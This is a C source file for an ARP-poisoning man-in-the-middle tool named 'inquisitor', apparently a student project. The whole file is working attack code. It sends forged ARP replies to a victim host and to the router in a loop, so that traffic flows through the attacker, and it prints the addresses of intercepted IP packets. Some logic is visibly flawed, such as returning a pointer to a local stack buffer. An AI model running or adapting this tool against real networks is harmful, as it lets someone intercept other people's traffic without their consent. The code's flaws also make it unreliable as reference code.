#include "inquisitor.h"
#include "include/inquisitor.h"

# include <stdio.h>
# include <stdlib.h>
#include <string.h>
# include <unistd.h>
# include <time.h>

#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <signal.h>
#include <netinet/ip.h>

//---------------------
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <linux/if_link.h>
#include <ifaddrs.h>

volatile int loop = 42;

static void usage(void)
{
	printf("./inquisitor [IP-src] [MAC-src] [IP-target] [MAC-target]\n");
	exit(1);
}

void error(const char *message)
{
	printf("[INQUISITOR] error: %s\n", message);
	exit(1);
}

//nic = network interface card
static char *get_nic(struct ifaddrs *ifaddr)
{
	char *nic;
	int family, flag;
	
	nic = NULL;
	for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) 
	{
		if (ifa->ifa_addr == NULL)
			continue;
		if (ifa->ifa_flags & IFF_LOOPBACK)
			continue;
		flag = 0;
		family = ifa->ifa_addr->sa_family;
		if (family == AF_PACKET) 
		{
			if (ifa->ifa_flags & IFF_UP)
				flag++;
			if (ifa->ifa_flags & IFF_RUNNING)
				flag++;
		}
		if (flag == 2)
		{
			nic = ifa->ifa_name;
			break ;
		}
	}
	return (nic);
}

static int raw_socket()
{
	struct timeval tv_out;
	int sock_fd;
	tv_out.tv_sec = 2;
    tv_out.tv_usec = 0;

	sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock_fd < 0)
		error("socket failed");
	if (setsockopt(sock_fd, SOL_SOCKET, SO_RCVTIMEO, &tv_out, sizeof(tv_out)) < 0)
		error("configure socket options failed");
	return (sock_fd);
}

// static struct in_addr get_access_point_ip(t_session session)
// {
//  /*this should be better made but to much for my mental sanity at least for now
//   * The thing is i should be able to know which is the ip of the access point
//   * but the way of knowing is against the norm and against the way im doing this project for using it on man in the middle project
//   * because of course im lazy enough for not doing the same project twice im going to go in deep with c just once :D
//   * but this part is tricky and im not going to do it now, so fucked im going to asssume that the ip is the one that starts with .1 
//   * on docker that works but in other kind of networks thats not always correct for example on 42 the access_point is 10.11.254.254
//   * and of course there is a lot of ways of getting this info but not today baby
//   * in terminal u can see this here :D command -> ip route show default                                                                                                                                                         deordone@car14s4
//   */
// 	struct in_addr target_ip;
//
// 	target_ip = session.src.ip;	
// 	unsigned char *bytes = (unsigned char *)&target_ip.s_addr;
// 	bytes[3] = 1;
//
// 	return (target_ip);
// }

static void send_packet(int sock, int index, struct arp_packet *pkt, unsigned char *dest_mac) 
{
	struct sockaddr_ll sll;

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;      
	sll.sll_ifindex = index;     
	sll.sll_halen = ETH_ALEN; 

	memcpy(sll.sll_addr, dest_mac, ETH_ALEN);

	if (sendto(sock, pkt, sizeof(struct arp_packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0) 
		error("Failed to send");
}

static void fill_arp_request(t_session session, struct arp_packet *pkt, int protocol)
{
	//Ethernet header	
	memset(pkt->eth.h_dest, 0xff, 6);          		// Destino: Broadcast (ff:ff:ff:ff:ff:ff)
	memcpy(pkt->eth.h_source, session.src.mac, 6);   // Origen: Tu MAC
	pkt->eth.h_proto = htons(ETH_P_ARP);			// Tipo: ARP (0x0806)

	//Body ARP
	pkt->arp.ea_hdr.ar_hrd = htons(ARPHRD_ETHER); // Hardware: Ethernet (1)
	pkt->arp.ea_hdr.ar_pro = htons(ETH_P_IP);    // Protocolo: IPv4 (0x0800)
	pkt->arp.ea_hdr.ar_hln = 6;                  // Tamaño MAC: 6
	pkt->arp.ea_hdr.ar_pln = 4;                  // Tamaño IP: 4
	pkt->arp.ea_hdr.ar_op = htons(protocol); // Operación: REQUEST | REPLY

	//Directions inside body ARP
	memcpy(pkt->arp.arp_sha, session.src.mac, 6);           // Sender MAC
	memcpy(pkt->arp.arp_spa, &session.src.ip.s_addr, 4);    // Sender IP
	memcpy(pkt->arp.arp_tha, session.dst.mac, 6);  	       // Target MAC 
	memcpy(pkt->arp.arp_tpa, &session.dst.ip.s_addr, 4);    // Target IP 
}

static unsigned char *receive_arp_response(int socket)
{
	struct arp_packet resp;
	struct sockaddr_ll from;
	socklen_t from_len = sizeof(from);

	ssize_t res = recvfrom(socket, &resp, sizeof(resp), 0, (struct sockaddr*)&from, &from_len);

	if (res > 0) 
	{
		if (ntohs(resp.eth.h_proto) == ETH_P_ARP && ntohs(resp.arp.ea_hdr.ar_op) == ARPOP_REPLY) 
		{
			unsigned char *mac = resp.arp.arp_sha;
			return (mac);
		}
	}
	return (0);
}

static void get_access_point_mac(int socket, unsigned int *index, t_session session, t_pair *access_point)
{
	unsigned char *temp_mac;
	struct ifaddrs *ifaddr;
	struct arp_packet pkt;
	t_session first;

	if (getifaddrs(&ifaddr) == -1)\
		error("cannot access mac address of the system");

	char *name = get_nic(ifaddr);
	*index = if_nametoindex(name);           
	//access_point->ip = session.dst.ip;
	//access_point->ip = get_access_point_ip(session); 
	//first.dst.ip = access_point->ip;
	first.src.ip = session.dst.ip;
	memcpy(first.dst.mac, session.dst.mac, 6);
	first.dst.ip = session.src.ip;
	memset(first.dst.mac, 0, 6);
	fill_arp_request(first, &pkt, ARPOP_REQUEST);
	send_packet(socket, *index, &pkt, pkt.eth.h_dest);
	temp_mac = receive_arp_response(socket);
	if (temp_mac)
    	memcpy(access_point->mac, temp_mac, 6);
	else 
		error("Cannot get access point MAC");
	freeifaddrs(ifaddr);
}

static void poisoning(int sock, int index, t_session session, t_pair access_point)
{
	struct arp_packet router_packet;
	struct arp_packet victim_packet;
	t_session router_session;
	time_t last_poison = 0;
	unsigned char buffer[2048];

	router_session = session;
	router_session.src.ip = session.dst.ip;
	router_session.dst.ip = session.src.ip;

	memcpy(router_session.dst.mac, access_point.mac, 6);

	while(loop)
	{
		time_t now = time(NULL);
		if (now - last_poison >= 2)
		{
			//POISON VICTIM 
			//session -> src -> ip victim  
			//session -> src -> mac attacker 
			//session -> dst -> ip router  
			//session -> dst -> mac router 
			//access_point -> mac victim
			fill_arp_request(session, &victim_packet, ARPOP_REPLY);
			send_packet(sock, index, &victim_packet, access_point.mac);
			//POISON ROUTER 
			//router_session -> src -> ip router  
			//router_session -> src -> mac attacker 
			//router_session -> dst -> ip victim  
			//router_session -> dst -> mac victim 
			fill_arp_request(router_session, &router_packet, ARPOP_REPLY);
			send_packet(sock, index, &router_packet, session.dst.mac);
			last_poison = now;
		}

		ssize_t bytes = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);

		if (bytes > 0)
		{
			struct ethhdr *eth = (struct ethhdr *)buffer;

			if (ntohs(eth->h_proto) == ETH_P_IP)
			{
				struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));

				printf("CAPTURA: %s -> ", inet_ntoa(*(struct in_addr *)&ip->saddr));
				printf("%s [%ld bytes]\n", inet_ntoa(*(struct in_addr *)&ip->daddr), bytes);
			}
		}
	}
}

//signal handler
static void loop_handler(int sig)
{
	loop = 0;
	(void)sig;
}

int main (int ac, char *av[])
{
	int socket;
	unsigned int index;
	t_session session;
	t_pair access_point;

	if (ac != 5)	
		usage();
	parse_input(av, &session);
	socket = raw_socket();
	get_access_point_mac(socket, &index, session, &access_point);
	signal(SIGINT, loop_handler);
	poisoning(socket, index, session, access_point);

	printf("[DEBUG] MAC Recibida: %02x:%02x:%02x:%02x:%02x:%02x\n",
		access_point.mac[0], access_point.mac[1], access_point.mac[2], access_point.mac[3], access_point.mac[4], access_point.mac[5]);
	return (0);
}
